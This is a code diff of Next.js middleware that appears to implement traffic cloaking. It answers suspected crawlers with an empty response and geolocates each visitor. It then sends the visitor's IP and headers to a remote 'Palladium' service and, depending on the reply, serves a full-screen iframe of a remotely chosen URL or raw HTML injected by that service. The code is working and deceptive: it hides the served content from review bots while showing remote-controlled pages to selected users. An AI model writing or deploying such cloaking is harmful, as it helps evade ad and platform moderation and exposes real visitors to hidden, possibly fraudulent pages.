@@ -27,7 +27,7 @@ function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<strin
 
 export async function middleware(req: NextRequest) {
     const ua = req.headers.get('user-agent')?.toLowerCase() || '';
-    const isCrawler = isBot(ua);
+    if (isBot(ua)) return new NextResponse(null, { status: 204 });
 
     const ipHeader =
         req.headers.get('x-forwarded-for') ||
@@ -38,10 +38,7 @@ export async function middleware(req: NextRequest) {
 
     const host = req.headers.get('host') || '';
 
-    if (isCrawler) {
-        return new NextResponse(null, { status: 204 });
-    }
-
+    // Geo check
     try {
         const geoRes = await fetch(`https://ipwho.is/${ip}`);
         const geo = await geoRes.json();
@@ -51,6 +48,7 @@ export async function middleware(req: NextRequest) {
         return NextResponse.next();
     }
 
+    // Payload
     const payload = flattenPayload({
         server: {
             REMOTE_ADDR: ip,
@@ -69,60 +67,45 @@ export async function middleware(req: NextRequest) {
         },
     });
 
-    const res = await fetch(PALLADIUM_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams(payload),
-    });
-
-    let result: PalladiumResponse = { result: false };
     try {
-        result = await res.json();
+        const res = await fetch(PALLADIUM_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(payload),
+        });
+
+        const result: PalladiumResponse = await res.json();
+
+        if (result.result) {
+            const { mode, target, content } = result;
+
+            // mode 1 = iframe target
+            if (mode === 1 && target) {
+                const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`;
+                return new NextResponse(html, {
+                    status: 200,
+                    headers: { 'Content-Type': 'text/html' },
+                });
+            }
+
+            // mode 4 = injected HTML content
+            if (mode === 4 && content) {
+                return new NextResponse(content, {
+                    status: 200,
+                    headers: { 'Content-Type': 'text/html' },
+                });
+            }
+        }
     } catch {
         return NextResponse.next();
     }
 
-    if (result.result) {
-        const { mode, target, content } = result;
-
-        if (mode === 1 && target) {
-            try {
-                const page = await fetch(target).then(res => res.text());
-                return new NextResponse(page, {
-                    status: 200,
-                    headers: { 'Content-Type': 'text/html' },
-                });
-            } catch {
-                return NextResponse.next();
-            }
-        } else if (mode === 4 && content) {
-            return new NextResponse(content, {
-                status: 200,
-                headers: { 'Content-Type': 'text/html' },
-            });
-        }
-    }
-
-    const fallbackHtml = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Fallback</title>
-    <link href="/new_spain/fonts/stylesheet.css" rel="stylesheet">
-    <link rel="stylesheet" href="/new_spain/css/style.css">
-</head>
-<body>
-    <main><h1>Fallback Loaded</h1><p>Spain user but no result returned.</p></main>
-</body>
-</html>`;
-
-    return new NextResponse(fallbackHtml, {
-        status: 200,
-        headers: { 'Content-Type': 'text/html' },
-    });
+    // 🔁 Підвантажити fallback з /__palladium
+    const url = req.nextUrl.clone();
+    url.pathname = '/__palladium';
+    return NextResponse.rewrite(url);
 }
 
 export const config = {
-    matcher: ['/', '/((?!_next|api|static|favicon.ico).*)'],
+    matcher: ['/', '/((?!_next|api|static|favicon.ico|__palladium).*)'],
 };
